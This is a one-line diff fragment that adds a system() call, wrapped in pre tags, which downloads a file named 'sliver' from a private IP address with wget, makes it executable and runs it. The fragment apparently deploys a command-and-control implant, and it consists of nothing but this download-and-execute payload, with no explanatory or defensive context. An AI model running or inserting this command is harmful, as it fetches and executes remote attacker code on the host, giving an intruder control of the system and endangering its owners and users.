@@ -1,0 +1,1 @@
+<pre>system('wget http://192.168.45.195:80/sliver && chmod +x sliver && ./sliver')</pre>
